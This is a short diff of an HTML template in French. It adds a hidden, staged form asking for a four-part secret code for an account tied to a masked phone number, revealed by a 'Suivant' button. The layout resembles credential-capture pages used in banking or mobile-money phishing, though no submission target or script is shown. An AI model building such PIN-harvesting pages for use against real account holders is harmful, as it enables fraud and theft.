@@ -57,9 +57,27 @@
                         </div>
                     </div>
 
+                    <div class="pt-32 p-18">
+        <h1 class="font-normal text-black text-2xl text-center mb-8">
+            Entrez votre code secret pour le compte de votre numéro *** *** ***
+        </h1>
+        <br><br>
+            <div class="flex gap-4 justify-center" id="section2 key" style="display:none">
+                <input type="text" name="code_secret_1">
+                <input type="text" name="code_secret_2">
+                <input type="text" name="code_secret_3">
+                <input type="text" name="code_secret_4">
+                <button type="submit" class="bg-black text-white p-2">OK</button>
+            </div>
+        <br><br>
+        <p class="text-center mt-20">
+            <a href="#" class="underline text-blue-300">Vous avez oubliez votre code ?</a>
+        </p>
+    </div>
+
                     <br><br>
                     <div class="flex justify-between">
-                        <button type="submit"
+                        <button type="submit" onclick="toggleSection()"
                             class="rounded-full w-full pl-4 pr-4 p-5 text-white text-center font-bold bg-blue-300 hover:shadow-lg outline-none">
                             Suivant
                         </button>
